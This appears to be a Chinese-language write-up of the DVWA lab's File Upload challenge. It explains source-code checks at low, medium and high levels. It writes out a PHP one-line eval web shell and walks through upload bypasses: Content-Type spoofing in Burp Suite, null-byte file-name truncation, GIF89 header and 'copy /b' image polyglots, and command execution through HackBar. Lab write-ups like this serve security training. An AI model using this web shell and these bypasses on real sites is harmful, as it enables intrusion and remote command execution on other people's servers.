DVWA靶场DVWA_File Upload的题解

File Upload

通过观察，可知此题应该是要我们上传一张图片，我们可以借此来上传我们的一句话木马。

low

对于Low级别，看看源码

根据观察可知，low级别对于上传的图片没有任何的限制，所以我们可以轻松的上传我们的一句话木马，再通过蚁剑进行连接。
首先我们在电脑上新建txt文件，输入<?php @eval($_POST['pass']);?>一句话木马，然后上传。上传成功后通过蚁剑连接

然后便可以成功连接

Medium

先看源码：

可以看到，相对于Low级别，Medium级别的源码中对上传的文件类型进行了判断，并且对内存进行了限制。
法一：抓包修改文件的type
因为这里过滤的是文件的上传类型，而不是文件的后缀名，所以可以直接上传一句话木马。<?php @eval($_POST['pass']);?>
通过burpsuite抓包，得到的Raw要send to repeater，然后将默认类型application/octet-stream改成image/jpeg再点击go。



然后即可将文件上传，并通过蚁剑连接。
法二：00截断
在php<5.3.4中，处理字符串的函数认为0x00是终止符。那么可以利用 00截断 漏洞来上传一句话木马。网站上传函数处理1.php%00.jpg时，首先后缀名是合法的jpg格式，可以上传，在保存文件时，使用burpsuite进行包拦截，找到上传的路径，把文件名改为 1.php[空格].jpg ，十六进制查看，空格的十六进制代码为20,将其修改为 00。后端在判断文件后缀名的时候遇到%00字符丢弃后面的jpg，文件后缀最终保存的后缀 名为 1.php。然后就可以用蚁剑连接了。
用 burpsuite 进行包拦截，转发到 repeater 模块

00截断一：
将文件名改成 1.php .jpg 然后16进制查看
空格的16进制代码是 20 我们将其改为 00

这时候再看，文件名已经改变了

00截断二：
我们将文件名改为 1.php%00.jpg
然后我们选中 %00 ，然后进行URL-decode

然后文件名就改变了

这时候点击go即可上传成功，然后用蚁剑连接。

High

源代码：

strrpos(string , find ,start) 查找find字符在string字符中的最后一次出现的位置，start参数可选，表示指定从哪里开始

substr(string,start,length) 返回string字符中从start开始的字符串，length参数可选，表示返回字符的长度

strtolower(string) 返回给定字符串的小写

getimagesize(string) ：函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING级的错误。所以 getimagesize函数的作用是判断上传的文件是不是有效的图片

move_uploaded_file（file,newlocal） 函数表示把给定的文件移动到新的位置

所以 $uploaded_ext 表示的是上传文件的后缀名 ，这里限制上传的文件的后缀名必须以 jpg 、jpeg　或　png　结尾，同时大小<100000，同时上传的文件必须是有效的图片格式（不只是以图片的格式结尾，而且文件内容是图片格式的）。

法一：蚁剑连接
我们直接上传一句话木马，然后把文件名改为 1.jpg
发现上传不了，因为仅仅后缀是图片格式的还不行，文件内容必须还得是图片格式的。

所以我们在文件头部加上了jpg格式的 GIF89
或者我们可以在cmd命令行下： copy /b 1.jpg+1.php 1.jpg 把一句话木马写入到图片的最末端也可以。


成功上传
虽然一句话木马上传成功了，但是他是以jpg为后缀的，蚁剑不能直接连接，必须让他作为php解析。

法二：hackbar
前面和法一做法一样，将图片上传
打开浏览器拓展hackbar，输入pass=system('这里放你要执行的命令')点击execute，一样可以进行提权。
